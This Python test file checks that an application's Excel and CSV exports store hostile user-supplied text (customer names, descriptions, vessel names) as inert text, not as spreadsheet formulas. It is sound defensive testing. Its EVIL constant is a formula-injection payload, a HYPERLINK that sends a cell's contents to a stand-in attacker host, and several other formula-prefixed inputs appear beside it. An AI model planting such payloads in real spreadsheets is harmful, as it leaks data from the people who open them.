"""Typed-in text never runs as a spreadsheet formula in an export (CWE-1236).

Anyone can self-register as a customer and choose their own name; staff type goods descriptions and vessel names. The
single-record exports wrote that text raw: openpyxl stores a string starting with `=` as a formula, and a csv cell
starting with `=`, `+`, `-` or `@` is read as one by Excel. The list exports (`test_list_exports.py`) were written
safe; these cover the older exporters and the shared csv writer.
"""

import csv
import io
from decimal import Decimal
from io import BytesIO

import openpyxl
import pytest

from services.excel._tables import csv_safe, neutralise_formulas
from services.excel.export_billing import generate_billing_xlsx
from services.excel.export_manifest import generate_manifest_xlsx
from services.excel.export_packing_list import generate_packing_list_xlsx
from services.excel.service import _rows_to_csv

EVIL = '=HYPERLINK("http://evil.example/?"&A2,"Click")'
ITEM = {"carton_tag": EVIL, "tracking_code": "TRK-1", "description": EVIL, "cbm": Decimal("1.5"), "received_date": None}


def _cells(buffer: BytesIO):
    workbook = openpyxl.load_workbook(BytesIO(buffer.getvalue()))
    return [cell for sheet in workbook.worksheets for row in sheet.iter_rows() for cell in row]


def _assert_no_formulas(buffer: BytesIO) -> None:
    cells = _cells(buffer)
    assert [c.coordinate for c in cells if c.data_type == "f"] == []
    assert any(c.value == EVIL for c in cells), "the text itself must still be there, as text"


class TestXlsxExports:
    def test_the_invoice_export_keeps_a_hostile_customer_name_as_text(self):
        _assert_no_formulas(generate_billing_xlsx([{"customer_name": EVIL, "total_ngn": "100", "status": "unpaid"}]))

    def test_the_manifest_export_keeps_hostile_names_tags_and_descriptions_as_text(self):
        rows = [{"customer_name": EVIL, "carton_count": 1, "total_weight_kg": 1, "total_cbm": 1, "carton_tags": EVIL}]
        _assert_no_formulas(generate_manifest_xlsx("Acme", "MSCU1", rows, [ITEM]))

    def test_the_packing_list_export_keeps_hostile_text_as_text(self):
        _assert_no_formulas(generate_packing_list_xlsx("Acme", "MSCU1", EVIL, [ITEM]))

    def test_a_hostile_tenant_or_container_name_in_a_header_is_text_too(self):
        _assert_no_formulas(generate_packing_list_xlsx(EVIL, EVIL, "Ngozi", [{**ITEM, "description": EVIL}]))

    def test_numbers_stay_numbers(self):
        cells = _cells(generate_billing_xlsx([{"customer_name": "Ngozi", "total_ngn": "100", "amount_paid_ngn": "250"}]))
        assert any(c.data_type == "n" and c.value == -150 for c in cells), "outstanding (100 - 250) must stay a number"

    def test_neutralise_formulas_only_touches_formula_cells(self):
        workbook = openpyxl.Workbook()
        sheet = workbook.active
        sheet["A1"] = "=1+1"
        sheet["A2"] = "plain"
        sheet["A3"] = 5
        neutralise_formulas(workbook)
        assert [sheet[c].data_type for c in ("A1", "A2", "A3")] == ["s", "s", "n"]
        assert sheet["A1"].value == "=1+1"


class TestCsvExports:
    @staticmethod
    def _rows(rows, columns):
        return list(csv.reader(io.StringIO(_rows_to_csv(rows, columns).getvalue().decode("utf-8-sig"))))

    @pytest.mark.parametrize("hostile", [EVIL, "+1 555 0100", "-2+3", "@SUM(1)", "\tx"])
    def test_hostile_text_is_defused(self, hostile):
        assert self._rows([{"customer_name": hostile}], ["customer_name"])[1] == [f"'{hostile}"]

    def test_a_negative_amount_is_still_a_plain_number(self):
        rows = self._rows([{"customer_name": "Ngozi", "balance_ngn": Decimal("-150.00")}], ["customer_name", "balance_ngn"])
        assert rows[1] == ["Ngozi", "-150.00"]

    def test_ordinary_text_and_missing_values_are_unchanged(self):
        rows = self._rows([{"customer_name": "Ngozi Adeyemi", "status": None}], ["customer_name", "status", "absent"])
        assert rows[0] == ["customer_name", "status", "absent"]
        assert rows[1] == ["Ngozi Adeyemi", "", ""]

    def test_columns_not_asked_for_are_left_out(self):
        assert self._rows([{"customer_name": "N", "secret": "x"}], ["customer_name"])[1] == ["N"]

    def test_csv_safe_leaves_non_text_alone(self):
        assert csv_safe(Decimal("-1")) == Decimal("-1")
        assert csv_safe(-5) == -5
        assert csv_safe(None) is None
        assert csv_safe("=x") == "'=x"
